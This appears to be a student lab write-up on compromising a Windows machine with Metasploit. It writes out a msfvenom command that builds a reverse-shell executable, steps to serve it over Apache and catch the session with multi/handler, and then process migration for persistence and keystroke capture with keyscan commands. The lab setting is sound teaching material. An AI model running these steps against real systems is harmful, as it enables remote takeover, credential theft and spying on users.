# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="880" height="385" alt="Screenshot 2025-10-06 090020" src="https://github.com/user-attachments/assets/2f6a1c68-586e-4576-ba3e-49b9db8bd8aa" />
<img width="839" height="164" alt="Screenshot 2025-10-06 090026" src="https://github.com/user-attachments/assets/2261b006-1772-4ae6-9b7a-db65d5b63741" />


copy the fun.exe into the apache ```/var/www/html ```folder

<img width="333" height="53" alt="Screenshot 2025-10-06 090346" src="https://github.com/user-attachments/assets/f78b21ec-0f04-4a33-9f80-cf46c91735eb" />


Start apache server ```sudo systemctl apache2 start``` 

<img width="349" height="55" alt="Screenshot 2025-10-06 090350" src="https://github.com/user-attachments/assets/78838929-378f-48f5-8145-950bcaf58482" />


Check the status of apache2 ```sudo apache2 status```

<img width="1909" height="563" alt="Screenshot 2025-10-06 090357" src="https://github.com/user-attachments/assets/1608f1ab-2625-4fd2-9e50-ed354babaf7a" />

Invoke msfconsole:

<img width="857" height="638" alt="Screenshot 2025-10-06 090523" src="https://github.com/user-attachments/assets/876009cb-6eff-4b0f-9a9c-a6596821b05f" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="939" height="845" alt="Screenshot 2025-10-06 090530" src="https://github.com/user-attachments/assets/8c734900-ddd8-42dd-8464-1bbeeb68d59f" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

<img width="805" height="260" alt="Screenshot 2025-10-06 090644" src="https://github.com/user-attachments/assets/57d5771f-ae11-4331-9745-c5fa85907250" />


### Output 


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="1919" height="1139" alt="Screenshot 2025-10-06 090448" src="https://github.com/user-attachments/assets/0441c906-9b88-4b5c-83f7-3dd926a0eab7" />


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

